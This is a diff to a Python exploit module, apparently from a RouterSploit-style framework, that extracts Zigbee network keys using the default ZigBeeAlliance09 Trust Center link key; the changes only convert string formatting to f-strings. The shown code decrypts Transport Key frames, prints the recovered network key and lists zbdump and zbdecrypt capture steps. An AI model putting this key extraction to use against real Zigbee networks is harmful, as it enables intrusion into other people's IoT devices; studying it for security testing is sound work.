@@ -129,7 +129,7 @@ class Exploit(Exploit):
     def _validate_channel(self):
         ch = int(self.channel)
         if ch < 11 or ch > 26:
-            print_error("Canal inválido: {} (deve ser 11-26)".format(ch))
+            print_error(f"Canal inválido: {ch} (deve ser 11-26)")
             return False
         return True
 
@@ -166,14 +166,14 @@ class Exploit(Exploit):
 
     @multi
     def run(self):
-        print_status("Zigbee Network Key Extraction — canal {}".format(self.channel))
+        print_status(f"Zigbee Network Key Extraction — canal {self.channel}")
         if not self._validate_channel():
             return
         tc_key = self._parse_tc_link_key()
         if not tc_key:
             return
 
-        print_info("Trust Center Link Key: {} (ZigBeeAlliance09 padrão)".format(tc_key.hex()))
+        print_info(f"Trust Center Link Key: {tc_key.hex()} (ZigBeeAlliance09 padrão)")
         print_info("Interface: {}".format(self.interface or "(não configurada)"))
 
         if not self.interface.strip():
@@ -193,12 +193,12 @@ class Exploit(Exploit):
             key_type = plaintext[1]
             extracted_key = plaintext[2:18]
 
-            print_success("APS Command ID: 0x{:02X} (Transport Key)".format(cmd_id))
+            print_success(f"APS Command ID: 0x{cmd_id:02X} (Transport Key)")
             print_success("Key Type: 0x{:02X} ({})".format(
                 key_type,
                 "Standard Network Key" if key_type == _KEY_TYPE_STANDARD_NWK else "Desconhecido",
             ))
-            print_success("NETWORK KEY EXTRAÍDA: {}".format(extracted_key.hex()))
+            print_success(f"NETWORK KEY EXTRAÍDA: {extracted_key.hex()}")
 
             if extracted_key == demo["original_key"]:
                 print_success("Verificação: chave extraída corresponde à original")
@@ -228,4 +228,4 @@ class Exploit(Exploit):
             self.interface or "CC2531", self.channel))
         print_info("  3. zbdump -i {} -c {} -w join.pcap".format(
             self.interface or "CC2531", self.channel))
-        print_info("  4. zbdecrypt -k {} join.pcap".format(tc_key.hex()))
+        print_info(f"  4. zbdecrypt -k {tc_key.hex()} join.pcap")
